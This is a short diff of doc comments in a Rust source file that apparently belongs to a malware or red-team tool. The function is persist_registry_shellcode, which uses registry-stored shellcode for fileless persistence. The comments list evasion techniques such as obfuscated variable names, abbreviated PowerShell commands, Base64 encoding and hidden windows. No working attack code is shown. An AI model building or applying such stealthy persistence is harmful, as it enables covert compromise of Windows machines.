@@ -266,8 +266,8 @@ pub fn persist_registry_shellcode(config: &FilelessConfig) -> Result<String, Str
 /// 4. Executes shellcode
 ///
 /// **Obfuscation techniques**:
-/// - Variable name randomization
-/// - Command abbreviation (iex instead of Invoke-Expression)
+/// - Variable name obfuscation
+/// - Command abbreviation (gp instead of Get-ItemProperty)
 /// - Base64 encoding of critical parts
 /// - Hidden window execution
 #[cfg(target_os = "windows")]
